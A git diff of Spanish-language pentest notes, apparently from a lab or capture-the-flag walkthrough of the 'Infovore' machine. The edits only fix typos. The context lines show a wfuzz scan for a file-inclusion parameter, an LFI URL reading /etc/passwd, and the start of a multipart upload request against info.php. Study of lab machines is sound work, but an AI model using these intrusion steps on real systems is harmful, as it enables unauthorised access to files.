@@ -527,7 +527,7 @@ ssh -i id_rsa -p 2082 root@votenow.local
 
 ## Infovore
 
-	- filtramos por **disable_functions** en el archivo **info.php**
+- Filtramos por **disable_functions** en el archivo **info.php**
 - Filtrar por user en **info.php**
 - Filtrar por file_uploads: **On** --> buscar en google para encontrar la vuln de **LFI**
 >Podemos ver que funciones o comandos están deshabilitados
@@ -541,7 +541,7 @@ wfuzz -c --hl=136 --hc=404,400,403,500 -w /home/kuser/cosas/repositorios/SecList
 > Encontramos http://192.168.1.141/index.php?filename=/etc/passwd
 > Eso es que podemos visitar algún archivo
 
-- subida de archivos desd info.php con **boundary**, ponemos los límites con ese etxto "esteesellimite"
+- subida de archivos desde info.php con **boundary**, ponemos los límites con ese etxto "esteesellimite"
 ```BURP
 Content-Type: multipart/form-data; boundary=----esteesellimite
 Content-Length: 186
